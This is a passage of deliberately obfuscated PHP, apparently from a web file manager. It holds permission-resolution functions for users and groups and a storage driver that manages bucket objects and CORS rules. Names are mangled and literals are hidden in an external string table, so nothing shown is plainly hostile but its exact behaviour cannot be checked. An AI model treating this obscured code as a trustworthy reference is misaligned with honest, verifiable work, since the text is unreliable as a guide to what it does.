$úÏÅş•[$¯„ø‹î[554]][$¯„ø‹î[2110]] == 1) { return !0; } return !1; } private function sourceAuthInfo($íáôóúÃ) { $á˜í¯Ş =& $_SERVER[ú‡®¯¨±]; $ÌÜ —ƒ = Model($á˜í¯Ş[1389]); $Ñ½ ‰Ë¨ = $ÌÜ —ƒ->sourceInfo($íáôóúÃ); if (!$Ñ½ ‰Ë¨) { return !1; } $ÌÜ —ƒ->groupPathDisplay($Ñ½ ‰Ë¨); $É¬êÚÇ˜ = array($Ñ½ ‰Ë¨); $É¬êÚÇ˜ = $ÌÜ —ƒ->_listAppendPath($É¬êÚÇ˜); $Ñ½ ‰Ë¨ = $É¬êÚÇ˜[0]; $µè´Æ = $Ñ½ ‰Ë¨[$á˜í¯Ş[561]]; if (isset($Ñ½ ‰Ë¨[$á˜í¯Ş[569]])) { $°¸Ğ•şô = explode($á˜í¯Ş[8], trim($Ñ½ ‰Ë¨[$á˜í¯Ş[561]], $á˜í¯Ş[8])); array_shift($°¸Ğ•şô); $µè´Æ = $Ñ½ ‰Ë¨[$á˜í¯Ş[567]] . $á˜í¯Ş[2111] . implode($á˜í¯Ş[8], $°¸Ğ•şô); } return array($á˜í¯Ş[472] => $Ñ½ ‰Ë¨[$á˜í¯Ş[32]], $á˜í¯Ş[86] => KodIO::make($Ñ½ ‰Ë¨[$á˜í¯Ş[183]]), $á˜í¯Ş[2112] => $µè´Æ); } private function groupAuthInfo($ïß•’ÃÛ, $»â¯ƒ£œ) { $Ó½øÌá =& $_SERVER[ú‡®¯¨±]; $“ôä¼”² = Model($Ó½øÌá[564])->getInfo($»â¯ƒ£œ); return array($Ó½øÌá[2113] => intval($ïß•’ÃÛ[$Ó½øÌá[465]]), $Ó½øÌá[2096] => $ïß•’ÃÛ, $Ó½øÌá[2114] => LNG($Ó½øÌá[2115]), $Ó½øÌá[2105] => array($Ó½øÌá[472] => $“ôä¼”²[$Ó½øÌá[32]], $Ó½øÌá[86] => KodIO::make($“ôä¼”²[$Ó½øÌá[89]][$Ó½øÌá[183]]), $Ó½øÌá[2112] => $“ôä¼”²[$Ó½øÌá[568]])); } protected function groupRootAuth($›ñº­Ñ¯, $Í›±Ãã€ = false) { $–ô†›Ö =& $_SERVER[ú‡®¯¨±]; $Í›±Ãã€ = $Í›±Ãã€ ? $Í›±Ãã€ : USER_ID; $˜€›‚â = $Í›±Ãã€ . $–ô†›Ö[2116] . $›ñº­Ñ¯; static $ıœ©ğ ¥ = array(); if (isset($ıœ©ğ ¥[$˜€›‚â])) { return $ıœ©ğ ¥[$˜€›‚â]; } $öô‹€ñÉ = Model($–ô†›Ö[564])->getInfo($›ñº­Ñ¯); $Ã•®ô­¡ = $this->userGroupList($Í›±Ãã€); $«µñ¡±© = isset($Ã•®ô­¡[$›ñº­Ñ¯]) ? $Ã•®ô­¡[$›ñº­Ñ¯][$–ô†›Ö[465]] : !1; if ($«µñ¡±© && Model($–ô†›Ö[550])->authCheckAction($«µñ¡±©[$–ô†›Ö[465]], $–ô†›Ö[1927])) { $ıœ©ğ ¥[$˜€›‚â] = $«µñ¡±©; return $«µñ¡±©; } $™ş…ìşÌ = $this->sourceAuthSelect($öô‹€ñÉ[$–ô†›Ö[89]][$–ô†›Ö[183]]); $áâ„İÖ¢ = $™ş…ìşÌ ? $this->authMake($™ş…ìşÌ, $Í›±Ãã€) : !1; $ÖÎñÓ• = $áâ„İÖ¢ ? $áâ„İÖ¢[$–ô†›Ö[518]] : !1; $ıœ©ğ ¥[$˜€›‚â] = $ÖÎñÓ• ? $ÖÎñÓ• : $«µñ¡±©; return $ıœ©ğ ¥[$˜€›‚â]; } public function authOwnerApply($Çµœ¦İ‚) { $ÎÖæ»€Î =& $_SERVER[ú‡®¯¨±]; if (empty($Çµœ¦İ‚[$ÎÖæ»€Î[465]]) || isset($Çµœ¦İ‚[$ÎÖæ»€Î[2117]]) && $Çµœ¦İ‚[$ÎÖæ»€Î[2117]]) { return $Çµœ¦İ‚; } if (AuthModel::authCheckRoot($Çµœ¦İ‚[$ÎÖæ»€Î[465]][$ÎÖæ»€Î[466]])) { return $Çµœ¦İ‚; } $ú¨«åÚÎ = Model($ÎÖæ»€Î[1389])->parentLevelArray($Çµœ¦İ‚[$ÎÖæ»€Î[563]]); $ú¨«åÚÎ = array_merge(array($Çµœ¦İ‚[$ÎÖæ»€Î[183]]), array_reverse($ú¨«åÚÎ)); $¬«×üë‚ = $this->sourceAuthSelect($ú¨«åÚÎ); $·¹Í‹ƒ· = array(); $ĞŞ½™Ÿ» = array(); foreach ($¬«×üë‚ as $ßµñ«²÷ => $šŸêÃîÈ) { $¹Œ«´ = $this->authFolderOwnerUser($šŸêÃîÈ); $·¹Í‹ƒ·[$ßµñ«²÷] = $¹Œ«´; $ĞŞ½™Ÿ» = array_merge($ĞŞ½™Ÿ», $¹Œ«´[$ÎÖæ»€Î[640]]); if ($¹Œ«´[$ÎÖæ»€Î[2118]]) { break; } } if (count($ĞŞ½™Ÿ») == 0) { $ĞŞ½™Ÿ» = $this->authFolderOwnerGroup($Çµœ¦İ‚[$ÎÖæ»€Î[548]]); } $ĞŞ½™Ÿ» = array_unique($ĞŞ½™Ÿ»); if (AuthModel::authCheckRoot($Çµœ¦İ‚[$ÎÖæ»€Î[465]][$ÎÖæ»€Î[466]])) { $ĞŞ½™Ÿ»[] = USER_ID; } $Çµœ¦İ‚[$ÎÖæ»€Î[465]][$ÎÖæ»€Î[2119]] = Model($ÎÖæ»€Î[556])->userListInfo($ĞŞ½™Ÿ»); return $Çµœ¦İ‚; } private function authFolderOwnerGroup($Áü‰ï) { $ö »øŠù =& $_SERVER[ú‡®¯¨±]; $ãïë¢€Ï = Model($ö »øŠù[1996])->where(array($ö »øŠù[1906] => $Áü‰ï))->select(); $£æ†Ã÷ = array(); if (!$ãïë¢€Ï) { return $£æ†Ã÷; } foreach ($ãïë¢€Ï as $ÏŠÕŞš ) { $ÒÁÈÍ‹¬ = $this->authInfo($ÏŠÕŞš ); if (AuthModel::authCheckRoot($ÒÁÈÍ‹¬[$ö »øŠù[465]])) { $£æ†Ã÷[] = $ÏŠÕŞš [$ö »øŠù[1708]]; } } return $£æ†Ã÷; } private function authFolderOwnerUser($œ—öÁôƒ) { $·Ğ×‚°« =& $_SERVER[ú‡®¯¨±]; $ûÙ„ÅŒï = array(); $°¨§ºîº = !1; foreach ($œ—öÁôƒ as $ÀÎÃŞÙ) { $»Ÿ§ß—ƒ = $this->authInfo($ÀÎÃŞÙ); if ($ÀÎÃŞÙ[$·Ğ×‚°«[548]] == $·Ğ×‚°«[224]) { $°¨§ºîº = !0; } if ($ÀÎÃŞÙ[$·Ğ×‚°«[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($»Ÿ§ß—ƒ[$·Ğ×‚°«[465]])) { $ûÙ„ÅŒï[] = $ÀÎÃŞÙ[$·Ğ×‚°«[548]]; } } } return array($·Ğ×‚°«[640] => $ûÙ„ÅŒï, $·Ğ×‚°«[2118] => $°¨§ºîº); } public function authMake($Ùä…Ÿô, $ÛûØÉŒ = false) { $Û’ß¶ªé =& $_SERVER[ú‡®¯¨±]; $á«Àğ»ß = $this->authArrayCheck($Ùä…Ÿô, $ÛûØÉŒ); if ($á«Àğ»ß[$Û’ß¶ªé[2120]]) { $á«Àğ»ß[$Û’ß¶ªé[2120]] = $this->sourceAuthInfo($á«Àğ»ß[$Û’ß¶ªé[2120]]); } return $á«Àğ»ß; } public function authArrayCheck($ Éó®•, $àñâ¹ÀÑ = false) { $À—Í¯¿ø =& $_SERVER[ú‡®¯¨±]; if (!$ Éó®•) { return array($À—Í¯¿ø[466] => 0, $À—Í¯¿ø[518] => !1); } $àñâ¹ÀÑ = $àñâ¹ÀÑ ? $àñâ¹ÀÑ : USER_ID; $ëÎ¿ú»¶ = 0; $ŠÓÎÎ‹ = 0; $—«ï¦ã = 0; $š›ºÑ = 0; $Ó¾š‰Â = 0; $Âí”Óî¾ = 0; $áğëîá = 1000; $®£ãà€š = 0; $™½¡ñ¹ = 0; $ã»ïùÅ­ = 0; $ëó÷¹Â = 0; $Ëğ«…şÓ = array($À—Í¯¿ø[183] => 0); foreach ($ Éó®• as $Ëğ«…şÓ) { $™„ı›Ó— = $this->authInfo($Ëğ«…şÓ); if (!$™„ı›Ó—) { continue; } $¿Ø›°£ = $Ëğ«…şÓ[$À—Í¯¿ø[548]]; $õ’»Ìºû = intval($™„ı›Ó—[$À—Í¯¿ø[465]]); if ($Ëğ«…şÓ[$À—Í¯¿ø[180]] == SourceModel::TYPE_USER && $¿Ø›°£ == $àñâ¹ÀÑ) { $ëÎ¿ú»¶ = !0; $—«ï¦ã = $™„ı›Ó—; $ŠÓÎÎ‹ = $õ’»Ìºû; } else { if ($Ëğ«…şÓ[$À—Í¯¿ø[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¿Ø›°£, $àñâ¹ÀÑ)) { $š›ºÑ = !0; $Œ˜àÒå = $this->groupStepToUserGroup($¿Ø›°£, $àñâ¹ÀÑ); if ($Œ˜àÒå < $áğëîá) { $áğëîá = $Œ˜àÒå; $Ó¾š‰Â = $õ’»Ìºû; $Âí”Óî¾ = $™„ı›Ó—; $®£ãà€š = $¿Ø›°£; } if ($Œ˜àÒå == $áğëîá && $õ’»Ìºû >= $Ó¾š‰Â) { $Ó¾š‰Â = $õ’»Ìºû; $Âí”Óî¾ = $™„ı›Ó—; $®£ãà€š = $¿Ø›°£; } } else { if ($¿Ø›°£ == $À—Í¯¿ø[224]) { $™½¡ñ¹ = !0; $ëó÷¹Â = $™„ı›Ó—; $ã»ïùÅ­ = $õ’»Ìºû; } } } } if ($ëÎ¿ú»¶) { $”Êİô‚ = $ŠÓÎÎ‹; $™„ı›Ó— = $—«ï¦ã; $Ôëá™å¨ = LNG($À—Í¯¿ø[2121]); } else { if ($š›ºÑ) { $”Êİô‚ = $Ó¾š‰Â; $™„ı›Ó— = $Âí”Óî¾; $‘ãù‹ü× = Model($À—Í¯¿ø[564])->getInfo($®£ãà€š); $Ôëá™å¨ = $À—Í¯¿ø[165] . $‘ãù‹ü×[$À—Í¯¿ø[568]] . $À—Í¯¿ø[2122] . LNG($À—Í¯¿ø[2123]); } else { if ($™½¡ñ¹) { $”Êİô‚ = $ã»ïùÅ­; $™„ı›Ó— = $ëó÷¹Â; $Ôëá™å¨ = LNG($À—Í¯¿ø[2093]); } else { $”Êİô‚ = 0; $™„ı›Ó— = !1; $Ôëá™å¨ = $À—Í¯¿ø[12]; } } } $ÚúìĞñ² = array($À—Í¯¿ø[2113] => intval($”Êİô‚), $À—Í¯¿ø[2096] => $™„ı›Ó—, $À—Í¯¿ø[2114] => $Ôëá™å¨, $À—Í¯¿ø[2105] => $Ëğ«…şÓ[$À—Í¯¿ø[183]]); return $ÚúìĞñ²; } private function groupContainUser($Â›¦¹æ”, $ÚË—»Ï¬ = false) { return in_array($Â›¦¹æ”, $this->userGroupParents($ÚË—»Ï¬)); } private function groupStepToUserGroup($›áª¾«±, $ı¯ğ‚´ = false) { $¿×‡‚½ =& $_SERVER[ú‡®¯¨±]; $Ê›“¦ÙŞ = $this->userGroupList($ı¯ğ‚´); $ø«ØªÓá = 1000; $òİÕœ¿‰ = $GLOBALS[$¿×‡‚½[6]][$¿×‡‚½[91]][$¿×‡‚½[2009]] == 1; $«˜Û’úğ = $òİÕœ¿‰ ? 3 : 2; foreach ($Ê›“¦ÙŞ as $ÖÕ©¨¥) { if ($ÖÕ©¨¥[$¿×‡‚½[1906]] == $›áª¾«±) { return 0; } $„Ï¡Å— = explode($¿×‡‚½[50], trim($ÖÕ©¨¥[$¿×‡‚½[563]], $¿×‡‚½[50])); if ($„Ï¡Å—[0] == $¿×‡‚½[224] && count($„Ï¡Å—) > $«˜Û’úğ) { $ªÁªĞš = array_reverse(array_slice($„Ï¡Å—, $«˜Û’úğ)); $¦óæÃ´ = array_search($›áª¾«±, $ªÁªĞš); if ($¦óæÃ´ !== !1 && $¦óæÃ´ + 1 <= $ø«ØªÓá) { $ø«ØªÓá = $¦óæÃ´ + 1; } } } return $ø«ØªÓá; } private function userGroupList($»«ïÕ†î = false) { $„áÔ°ÌÅ =& $_SERVER[ú‡®¯¨±]; static $úÍ©üÈ× = array(); if (isset($úÍ©üÈ×[$»«ïÕ†î])) { return $úÍ©üÈ×[$»«ïÕ†î]; } $ŸüÅÃè¹ = Model($„áÔ°ÌÅ[577])->getInfo($»«ïÕ†î); $úÍ©üÈ×[$»«ïÕ†î] = array_to_keyvalue($ŸüÅÃè¹[$„áÔ°ÌÅ[2094]], $„áÔ°ÌÅ[1906]); return $úÍ©üÈ×[$»«ïÕ†î]; } public function userGroupParents($Ë´Ï¾Û¾) { $ˆ‰áªóï =& $_SERVER[ú‡®¯¨±]; static $¤”ªº¼¬ = array(); $Ë´Ï¾Û¾ = $Ë´Ï¾Û¾ ? $Ë´Ï¾Û¾ : USER_ID; if (isset($¤”ªº¼¬[$Ë´Ï¾Û¾])) { return $¤”ªº¼¬[$Ë´Ï¾Û¾]; } $ü§ÏÒğ = $this->userGroupList($Ë´Ï¾Û¾); $Ö¡óå¿¡ = array(); $†˜³ùŠ¦ = $GLOBALS[$ˆ‰áªóï[6]][$ˆ‰áªóï[91]][$ˆ‰áªóï[2009]] == 1; $Ò½¡òœé = $†˜³ùŠ¦ ? 3 : 2; foreach ($ü§ÏÒğ as $›ßŠ¼ğ) { $¡¶…İ‡ = array($›ßŠ¼ğ[$ˆ‰áªóï[1906]]); $‡ß¥›º… = explode($ˆ‰áªóï[50], trim($›ßŠ¼ğ[$ˆ‰áªóï[563]], $ˆ‰áªóï[50])); if ($‡ß¥›º…[0] == $ˆ‰áªóï[224] && count($‡ß¥›º…) > $Ò½¡òœé) { $ÔØÜ·¾Ø = array_slice($‡ß¥›º…, $Ò½¡òœé); $¡¶…İ‡ = array_merge($¡¶…İ‡, array_reverse($ÔØÜ·¾Ø)); } $Ö¡óå¿¡ = array_merge($Ö¡óå¿¡, $¡¶…İ‡); } $¤”ªº¼¬[$Ë´Ï¾Û¾] = array_unique($Ö¡óå¿¡); return $¤”ªº¼¬[$Ë´Ï¾Û¾]; } public function authTargetInfoMake($ñøà«ÁÅ) { $†œÓœ˜ñ =& $_SERVER[ú‡®¯¨±]; $õ°ß‰ó¿ = array(); $È´¢Î‹æ = array(); foreach ($ñøà«ÁÅ as $†Ÿàê´£) { if ($†Ÿàê´£[$†œÓœ˜ñ[180]] == SourceModel::TYPE_USER) { $õ°ß‰ó¿[] = intval($†Ÿàê´£[$†œÓœ˜ñ[548]]); } else { if ($†Ÿàê´£[$†œÓœ˜ñ[180]] == SourceModel::TYPE_GROUP) { $È´¢Î‹æ[] = intval($†Ÿàê´£[$†œÓœ˜ñ[548]]); } } } if ($õ°ß‰ó¿) { $õ°ß‰ó¿ = Model($†œÓœ˜ñ[556])->userListInfo($õ°ß‰ó¿); } if ($È´¢Î‹æ) { $’ö¿ÙöÓ = array($†œÓœ˜ñ[1994] => array($†œÓœ˜ñ[470], $È´¢Î‹æ)); $È´¢Î‹æ = Model($†œÓœ˜ñ[564])->field($†œÓœ˜ñ[2124])->where($’ö¿ÙöÓ)->select(); $È´¢Î‹æ = array_to_keyvalue($È´¢Î‹æ, $†œÓœ˜ñ[1906]); } return array($†œÓœ˜ñ[2125] => $õ°ß‰ó¿, $†œÓœ˜ñ[2126] => $È´¢Î‹æ); } public function authInfo($¹˜Ô¤â) { $º¨¶Öáá =& $_SERVER[ú‡®¯¨±]; if ($¹˜Ô¤â[$º¨¶Öáá[2010]]) { $÷èùæø¢ = Model($º¨¶Öáá[550])->listData($¹˜Ô¤â[$º¨¶Öáá[2010]]); if (!$÷èùæø¢) { return !1; $¤ŒÜÉçè = Model($º¨¶Öáá[550])->listData(); $ƒ¸èĞ¥ = array_filter_by_field($¤ŒÜÉçè, $º¨¶Öáá[465], $º¨¶Öáá[224]); return $ƒ¸èĞ¥; } $“¤âºµ° = array_field_key($÷èùæø¢, array($º¨¶Öáá[453], $º¨¶Öáá[32], $º¨¶Öáá[465], $º¨¶Öáá[1929], $º¨¶Öáá[1930])); $“¤âºµ°[$º¨¶Öáá[2127]] = $¹˜Ô¤â; return $“¤âºµ°; } else { return array($º¨¶Öáá[471] => 0, $º¨¶Öáá[1912] => $¹˜Ô¤â[$º¨¶Öáá[2070]], $º¨¶Öáá[472] => $º¨¶Öáá[12], $º¨¶Öáá[1929] => $º¨¶Öáá[2128]); } } } goto AØ›ï•Ù’½; b²ùƒÉ¹›ß: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($È¡˜ÁéŠ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ú‡®¯¨±][1427]; $this->_init($È¡˜ÁéŠ); } public function _init($ÈÏ¬Ìö) { $õèÍˆ­ =& $_SERVER[ú‡®¯¨±]; $this->config = $ÈÏ¬Ìö; foreach ($ÈÏ¬Ìö as $·œöÄÒµ => $Øå¹©è‚) { if (isset($this->{$·œöÄÒµ})) { $this->{$·œöÄÒµ} = $Øå¹©è‚; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($õèÍˆ­[1428] . LNG($õèÍˆ­[1429])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¤Ú‘’Ãı =& $_SERVER[ú‡®¯¨±]; $´°–½²Ã = new OSS\Model\CorsConfig(); $³ÊŞ¼®Ï = new OSS\Model\CorsRule(); $³ÊŞ¼®Ï->addAllowedOrigin($¤Ú‘’Ãı[1430]); $³ÊŞ¼®Ï->addAllowedMethod($¤Ú‘’Ãı[1431]); $³ÊŞ¼®Ï->addAllowedMethod($¤Ú‘’Ãı[1432]); $³ÊŞ¼®Ï->addAllowedMethod($¤Ú‘’Ãı[1433]); $³ÊŞ¼®Ï->addAllowedMethod($¤Ú‘’Ãı[1434]); $³ÊŞ¼®Ï->addAllowedMethod($¤Ú‘’Ãı[163]); $³ÊŞ¼®Ï->setMaxAgeSeconds(600); $³ÊŞ¼®Ï->addExposeHeader($¤Ú‘’Ãı[1435]); $³ÊŞ¼®Ï->addAllowedHeader($¤Ú‘’Ãı[1430]); $´°–½²Ã->addRule($³ÊŞ¼®Ï); try { $this->client->putBucketCors($this->bucket, $´°–½²Ã); } catch (OSS\Core\OssException $ÁƒŒñ•ş) { return !1; } return !0; } public function getBucketCors() { $¾©“ñÔÂ =& $_SERVER[ú‡®¯¨±]; $Üã™‘í© = null; try { $Üã™‘í© = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ğçÃ±äè) { return null; } if (!$Üã™‘í© || !($ŠØ¬ïÒ‘ = $Üã™‘í©->getRules())) { return null; } $¼şæ¬¦½ = $ŠØ¬ïÒ‘[0]->getAllowedOrigins(); $ÖêÃ¹Ìë = $ŠØ¬ïÒ‘[0]->getAllowedMethods(); $÷Ç¢šöÂ = $ŠØ¬ïÒ‘[0]->getMaxAgeSeconds(); $¡Òæòß’ = $ŠØ¬ïÒ‘[0]->getExposeHeaders(); $¹ŠÅàää = $ŠØ¬ïÒ‘[0]->getAllowedHeaders(); return array($¾©“ñÔÂ[214] => isset($¼şæ¬¦½[0]) ? $¼şæ¬¦½[0] : $¾©“ñÔÂ[12], $¾©“ñÔÂ[218] => $ÖêÃ¹Ìë, $¾©“ñÔÂ[1436] => $÷Ç¢šöÂ, $¾©“ñÔÂ[1437] => isset($¡Òæòß’[0]) ? $¡Òæòß’[0] : $¾©“ñÔÂ[12], $¾©“ñÔÂ[216] => isset($¹ŠÅàää[0]) ? $¹ŠÅàää[0] : $¾©“ñÔÂ[12]); } public function isBucketCors() { $ÒöÏâŠ =& $_SERVER[ú‡®¯¨±]; $È©ú»ÜÂ = $this->getBucketCors(); if (!$È©ú»ÜÂ || !is_array($È©ú»ÜÂ)) { return !1; } if ($È©ú»ÜÂ[$ÒöÏâŠ[214]] != $ÒöÏâŠ[215] || $È©ú»ÜÂ[$ÒöÏâŠ[216]] != $ÒöÏâŠ[215]) { return !1; } $àó¸°à = array_map($ÒöÏâŠ[217], $È©ú»ÜÂ[$ÒöÏâŠ[218]]); if (!is_array($àó¸°à)) { $àó¸°à = array(); } $ ¶¼‘äæ = array($ÒöÏâŠ[219], $ÒöÏâŠ[220], $ÒöÏâŠ[221], $ÒöÏâŠ[222], $ÒöÏâŠ[223]); $ûÍ×ŠÂ¢ = array_diff($ ¶¼‘äæ, $àó¸°à); return empty($ûÍ×ŠÂ¢); } public function mkfile($‚Ä¢æŒˆ, $ö¤»£ = '', $Šì©–Îà = REPEAT_RENAME) { $–š·ÊÌ€ = $this->setContent($‚Ä¢æŒˆ, $ö¤»£); if ($–š·ÊÌ€ !== !1) { return $this->getPathOuter($‚Ä¢æŒˆ); } return !1; } public function mkdir($‹äÂÕğ½, $şÖú£Ñ˜ = REPEAT_SKIP) { if ($şÖú£Ñ˜ && $this->_isFolder($‹äÂÕğ½)) { return $this->getPathOuter($‹äÂÕğ½); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‹äÂÕğ½)); } catch (OSS\Core\OssException $‡ÑÊÖå) { return !1; } return $this->getPathOuter($‹äÂÕğ½); } private function fileList($ÕîÑ³ª, $û¬±•Ğ = '', $±ùºØ¶ = 0) { $†Ô¹ëú =& $_SERVER[ú‡®¯¨±]; $ÕîÑ³ª = trim($ÕîÑ³ª, $†Ô¹ëú[8]); $¶íîÍ¸Ğ = empty($ÕîÑ³ª) && $ÕîÑ³ª !== $†Ô¹ëú[224] ? $†Ô¹ëú[12] : $ÕîÑ³ª . $†Ô¹ëú[8]; $×îÜµÏƒ = $†Ô¹ëú[12]; $Ë¥÷âêß = 1000; $½–´ˆ½ø = $¹¡êÆ = array(); while (!0) { check_abort(); $ø­ßô® = array($†Ô¹ëú[1438] => $û¬±•Ğ, $†Ô¹ëú[1439] => $¶íîÍ¸Ğ, $†Ô¹ëú[1440] => $Ë¥÷âêß, $†Ô¹ëú[1441] => $×îÜµÏƒ); try { $ú´‚Ø = $this->client->listObjects($this->bucket, $ø­ßô®); } catch (OSS\Core\OssException $ü¾»‘ëá) { break; } $×îÜµÏƒ = $ú´‚Ø->getNextMarker(); $öˆúëä® = $ú´‚Ø->getObjectList(); $×’Ü¸µ¼ = $ú´‚Ø->getPrefixList(); foreach ($öˆúëä® as $½¦¨ÖçÂ) { if ($½¦¨ÖçÂ->getKey() == $¶íîÍ¸Ğ) { continue; } $úøÇ²…ñ = $½¦¨ÖçÂ->getKey(); $æ²‹¯âã = $½¦¨ÖçÂ->getSize(); $†¦ªÄ±İ = $½¦¨ÖçÂ->getLastModified(); $´‘ó÷şü = trim($½¦¨ÖçÂ->getETag(), $†Ô¹ëú[120]); $À„®½Ç‹ = $±ùºØ¶ ? array($†Ô¹ëú[32] => $úøÇ²…ñ, $†Ô¹ëú[78] => $æ²‹¯âã, $†Ô¹ëú[196] => strtotime($†¦ªÄ±İ), $†Ô¹ëú[1442] => $´‘ó÷şü) : $úøÇ²…ñ; $¦‹“ˆ×­ = $æ²‹¯âã == 0 && substr($úøÇ²…ñ, strlen($úøÇ²…ñ) - 1, 1) == $†Ô¹ëú[8] ? !0 : !1; $Ÿ¸›åîë = array($†Ô¹ëú[78] => $æ²‹¯âã, $†Ô¹ëú[1443] => $æ²‹¯âã, $†Ô¹ëú[87] => strtotime($†¦ªÄ±İ), $†Ô¹ëú[1444] => $†¦ªÄ±İ, $†Ô¹ëú[1442] => $´‘ó÷şü); $this->cacheMethodInfoSet($úøÇ²…ñ, $¦‹“ˆ×­, $Ÿ¸›åîë); if ($¦‹“ˆ×­) { $½–´ˆ½ø[] = $úøÇ²…ñ; continue; } $¹¡êÆ[] = $À„®½Ç‹; } foreach ($×’Ü¸µ¼ as $â¯¹Æ) { $½–´ˆ½ø[] = $â¯¹Æ->getPrefix(); $this->cacheMethodInfoSet($â¯¹Æ->getPrefix(), !0); } if ($×îÜµÏƒ === $†Ô¹ëú[12]) { break; } } $this->cacheMethodInfoSet($ÕîÑ³ª, !0); return array($†Ô¹ëú[84] => $½–´ˆ½ø, $†Ô¹ëú[85] => $¹¡êÆ); } public function copyFile($ĞÈ›ø , $×—ïò×ö) { $ÎŠëèÉŠ = $this->size($ĞÈ›ø ); if ($ÎŠëèÉŠ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ĞÈ›ø , $this->bucket, $this->pathEncode($×—ïò×ö)); } catch (OSS\Core\OssException $·³îï ) { return !1; } return $this->getPathOuter($×—ïò×ö); } $€¡¼àô = $this->multiCopyObject($ĞÈ›ø , $×—ïò×ö, $ÎŠëèÉŠ); return $€¡¼àô ? $this->getPathOuter($×—ïò×ö) : !1; } private function multiCopyObject($«ÁÈ¡ÒĞ, $İš¿Í¢, $ôó·’É) { $èìÂ…¶Ë =& $_SERVER[ú‡®¯¨±]; try { $Ş‚Ïƒñ€ = array(); if ($ß´Ö„ô’ = $this->hashMd5($«ÁÈ¡ÒĞ)) { $Ş‚Ïƒñ€ = array(OSS\OssClient::OSS_HEADERS => array($èìÂ…¶Ë[1445] => $ß´Ö„ô’)); } $–ø§¡Ğä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İš¿Í¢), $Ş‚Ïƒñ€); $Úš‰Ô = 1; $˜ßª„² = 0; $Ä¼ŸŠìÒ = array(); $Æ¬¼ğ€ = 1024 * 1024 * 10; $Òü˜Êá× = $this->client->generateMultiuploadParts($ôó·’É, $Æ¬¼ğ€); foreach ($Òü˜Êá× as $ìà™€ığ => $û·ˆÅ¾…) { $Ü´´ÛÊ = $˜ßª„² + (int) $û·ˆÅ¾…[$èìÂ…¶Ë[1446]]; $ıÊıÆö = (int) $û·ˆÅ¾…[$èìÂ…¶Ë[392]] + $Ü´´ÛÊ - 1; $á’ãõ‹Ì = array($èìÂ…¶Ë[1447] => $Ü´´ÛÊ, $èìÂ…¶Ë[1448] => $ıÊıÆö); $Ä¼ŸŠìÒ[] = $this->client->uploadPartCopy($this->bucket, $«ÁÈ¡ÒĞ, $this->bucket, $this->pathEncode($İš¿Í¢), $Úš‰Ô, $–ø§¡Ğä, $á’ãõ‹Ì); $Úš‰Ô = $Úš‰Ô + 1; } $ÔÑæúÑÈ = array(); foreach ($Ä¼ŸŠìÒ as $ìà™€ığ => $êÜø‰ôù) { $ÔÑæúÑÈ[] = array($èìÂ…¶Ë[1449] => $ìà™€ığ + 1, $èìÂ…¶Ë[1450] => $êÜø‰ôù); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($İš¿Í¢), $–ø§¡Ğä, $ÔÑæúÑÈ); } catch (OSS\Core\OssException $˜ÛòÑ­) { return !1; } return !0; } public function moveFile($¬Èûµš¬, $¬ú†ËİÁ) { if ($this->copyFile($¬Èûµš¬, $¬ú†ËİÁ)) { $this->remove($¬Èûµš¬); return $this->getPathOuter($¬ú†ËİÁ); } return !1; } public function delFile($ç®–™›») { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ç®–™›»)); } catch (OSS\Core\OssException $°æ‘¾¨) { return !1; } return !0; } public function delFolder($×É‚Ô—) { $£×üÚ’ =& $_SERVER[ú‡®¯¨±]; if (!$this->exist($×É‚Ô—)) { return !0; } $this->listItemCache = !1; $û…É‡Şú = $this->fileList($×É‚Ô—); $this->listItemCache = !0; $»ë•Í÷ = trim($×É‚Ô—, $£×üÚ’[8]) . $£×üÚ’[8]; if (!empty($×É‚Ô—) && $×É‚Ô— !== $£×üÚ’[224] && !in_array($»ë•Í÷, $û…É‡Şú[$£×üÚ’[84]])) { $û…É‡Şú[$£×üÚ’[84]][] = $»ë•Í÷; } $ƒ¬ÉáÙ¡ = $this->delByBatch($û…É‡Şú[$£×üÚ’[85]]); if (!$ƒ¬ÉáÙ¡) { return !1; } $ƒ¬ÉáÙ¡ = $this->delByBatch($û…É‡Şú[$£×üÚ’[84]]); if (!$ƒ¬ÉáÙ¡) { return !1; } return $this->delFile($»ë•Í÷); } private function delByBatch($·ò‘Ì¿ö) { foreach (array_chunk($·ò‘Ì¿ö, 1000) as $İÍÒ´’) { try { $this->client->deleteObjects($this->bucket, $İÍÒ´’); } catch (OSS\Core\OssException $òœæÄØ°) { return !1; } } return !0; } public function rename($ÔˆøèÒ, $›Ùó˜Ã×) { return $this->renameObject($ÔˆøèÒ, $›Ùó˜Ã×); } private function fileInfo($•œİÄà, $™åôƒ‚ï = false, $õø®ÈŠ = array()) { $¦çÙ­…ú =& $_SERVER[ú‡®¯¨±]; $ç âŸê© = array($¦çÙ­…ú[32] => $this->pathThis($•œİÄà), $¦çÙ­…ú[86] => $this->getPathOuter($•œİÄà), $¦çÙ­…ú[33] => $¦çÙ­…ú[226], $¦çÙ­…ú[78] => isset($õø®ÈŠ[$¦çÙ­…ú[78]]) ? $õø®ÈŠ[$¦çÙ­…ú[78]] : 0, $¦çÙ­…ú[177] => $this->ext($•œİÄà)); if ($™åôƒ‚ï) { return $ç âŸê©; } $ç âŸê©[$¦çÙ­…ú[227]] = $ç âŸê©[$¦çÙ­…ú[87]] = 0; $ç âŸê©[$¦çÙ­…ú[228]] = $ç âŸê©[$¦çÙ­…ú[229]] = !0; if (empty($õø®ÈŠ)) { $†õ˜¥´‹ = $this->objectMeta($•œİÄà); if (!$†õ˜¥´‹) { return $ç âŸê©; } $õø®ÈŠ = array($¦çÙ­…ú[87] => strtotime($†õ˜¥´‹[$¦çÙ­…ú[1444]]), $¦çÙ­…ú[78] => 